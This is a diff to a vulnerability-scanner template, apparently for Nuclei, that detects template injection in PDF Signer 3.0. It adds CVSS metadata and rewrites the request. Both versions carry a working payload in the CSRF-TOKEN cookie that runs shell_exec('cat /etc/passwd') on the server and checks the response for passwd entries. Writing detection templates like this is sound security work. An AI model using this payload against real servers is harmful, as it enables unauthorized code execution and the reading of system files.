@@ -1,25 +1,24 @@
 id: pdf-signer-ssti-to-rce
 
 info:
-  name: PDF Signer v3.0 - SSTI to RCE via CSRF Cookie
+  name: PDF Signer 3.0 - Template Injection
   author: madrobot
-  severity: high
-  tags: ssti,rce
+  severity: critical
+  description: PDF Signer 3.0 is susceptible to a template injection which allows code execution, due to improper cookie handling and an improper CSRF implementation. An attacker can execute code on the server in the context of the web server.
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+    cvss-score: 9.8
+    cwe-id: CWE-1336
+  tags: ssti,rce,csrf
 
 requests:
-  - payloads:
-      Subdomains: /home/mahmoud/Wordlist/AllSubdomains.txt
-    attack: sniper
-    threads: 100
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+    headers:
+      Cookie: "CSRF-TOKEN=rnqvt{{shell_exec('cat /etc/passwd')}}to5gw; simcify=uv82sg0jj2oqa0kkr2virls4dl"
 
-    raw:
-      - |
-        GET / HTTP/1.1
-        Host: {{Subdomains}}
-        Accept-Encoding: gzip, deflate
-        Cookie: CSRF-TOKEN=rnqvt{{shell_exec('cat /etc/passwd')}}to5gw; simcify=uv82sg0jj2oqa0kkr2virls4dl
-        Connection: close
-        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko)
+    skip-variables-check: true
     matchers-condition: and
     matchers:
       - type: status
@@ -29,3 +28,5 @@ requests:
         regex:
           - "root:.*:0:0:"
         part: body
+
+# Enhanced by md on 2022/10/05
